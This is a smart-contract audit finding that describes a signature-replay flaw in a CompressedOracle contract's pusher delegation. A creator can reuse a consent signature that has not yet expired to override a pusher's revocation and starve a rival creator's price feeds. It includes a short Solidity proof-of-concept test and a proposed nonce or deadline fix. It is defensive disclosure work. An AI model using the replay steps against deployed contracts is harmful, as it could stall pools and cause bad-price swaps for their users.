### Title
Pusher Delegation Signature Replay Allows Creator to Override Revocation and Starve a Competing Creator's Feeds of Updates — (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` in `CompressedOracleV1` does not invalidate a pusher's EIP-191 consent signature after it is consumed. A creator who holds a valid, non-expired signature can replay it at any time before the deadline to re-establish delegation — even after the pusher has explicitly revoked via `revokePusher()` and re-delegated to a different creator. This lets Creator A silently override Creator B's delegation, diverting the pusher's slot writes back into Creator A's namespace and starving Creator B's feeds of updates. Pools whose `AnchoredPriceProvider` reads Creator B's feeds then receive stale prices and halt with `FeedStalled`, breaking core swap functionality.

---

### Finding Description

The `allowPushers` function signs a consent message that binds `(chainid, oracle, deadline, pusher, creator)`:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));

namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The only freshness gate is `_ensureDeadline(deadline)` — there is no nonce, no used-signature bitmap, and no check that `namespaceRemapping[pusher]` is currently zero. The code comment explicitly acknowledges the deadline is the sole replay barrier:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [2](#0-1) 

But the deadline only prevents replay *after it expires*. Before expiry, the same signature is unconditionally accepted on every call, overwriting whatever `namespaceRemapping[pusher]` currently holds.

`revokePusher` clears the mapping to `address(0)`:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

But this does not invalidate the original signature. Creator A can immediately call `allowPushers` again with the same signature and restore `namespaceRemapping[pusher] = A`, overriding any subsequent delegation the pusher established with Creator B.

The `fallback` push path resolves the namespace from `namespaceRemapping[msg.sender]` at push time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every slot word the pusher sends after Creator A's replay lands in Creator A's namespace, not Creator B's.

---

### Impact Explanation

Creator B's feeds receive no further updates. `AnchoredPriceProvider._readLeg` checks staleness on every swap:

```solidity
if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);
``` [5](#0-4) 

Once Creator B's feed timestamp ages past `MAX_REF_STALENESS`, `getBidAndAskPrice` returns `(0, type(uint128).max)` and the pool reverts with `FeedStalled`:

```solidity
if (bid == 0 || ask == type(uint128).max) revert FeedStalled();
``` [6](#0-5) 

Every swap, add-liquidity, and remove-liquidity path that calls `getBidAndAskPrice` is blocked. This is broken core pool functionality causing unusable swap/liquidity flows — within the allowed impact gate.

Additionally, Creator A's pools now receive slot data the pusher intended for Creator B's pair. If the two pools quote different token pairs, Creator A's pools execute swaps against a mismatched price, constituting bad-price execution.

---

### Likelihood Explanation

The trigger requires:
1. A pusher who signed a consent with a deadline far enough in the future (common in production deployments to avoid frequent re-signing).
2. A creator (Creator A) who retains the original signature and is willing to replay it.
3. The pusher revoking and re-delegating to Creator B.

All three conditions are realistic in a live multi-creator deployment. Creator A need not be globally malicious — a competitive or negligent creator who simply replays a cached signature suffices. The attack is a single public transaction with no ETH cost.

---

### Recommendation

Track consumed signatures with a per-pusher nonce or a `usedSignatures` bitmap. The simplest fix is to store the last-used deadline per `(pusher, creator)` pair and reject any replay of the same or an older deadline:

```solidity
mapping(address => mapping(address => uint256)) public lastDelegationDeadline;

// inside allowPushers loop:
require(deadline > lastDelegationDeadline[pusher][msg.sender], DeadlineReplayed());
lastDelegationDeadline[pusher][msg.sender] = deadline;
```

Alternatively, require the pusher's signature to commit to a monotonically increasing nonce stored on-chain, so each consent can only be used once regardless of deadline.

---

### Proof of Concept

```solidity
// 1. Pusher signs consent for Creator A with deadline = block.timestamp + 30 days
bytes memory sigA = _signConsent(PUSHER_KEY, deadline, pusher, creatorA);

// 2. Creator A establishes delegation
vm.prank(creatorA);
oracle.allowPushers(deadline, _arr(pusher), _arr(sigA));
assertEq(oracle.namespaceRemapping(pusher), creatorA);

// 3. Pusher revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0));

// 4. Pusher re-delegates to Creator B
bytes memory sigB = _signConsent(PUSHER_KEY, deadline2, pusher, creatorB);
vm.prank(creatorB);
oracle.allowPushers(deadline2, _arr(pusher), _arr(sigB));
assertEq(oracle.namespaceRemapping(pusher), creatorB);

// 5. Creator A replays the original signature — deadline still valid
vm.prank(creatorA);
oracle.allowPushers(deadline, _arr(pusher), _arr(sigA)); // succeeds, no revert

// 6. Delegation is now back to Creator A — Creator B's feeds will go stale
assertEq(oracle.namespaceRemapping(pusher), creatorA); // ← Creator B overridden

// 7. Pusher pushes data — lands in Creator A's namespace, not Creator B's
vm.prank(pusher);
(bool ok,) = address(oracle).call(slotWord);
assertTrue(ok);
// Creator B's feed: price=0, ts=0 → stale → FeedStalled on next pool swap
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-210)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L241-241)
```text
        namespaceRemapping[msg.sender] = address(0);
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L216-216)
```text
        if (bid == 0 || ask == type(uint128).max) revert FeedStalled();
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L283-283)
```text
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);
```
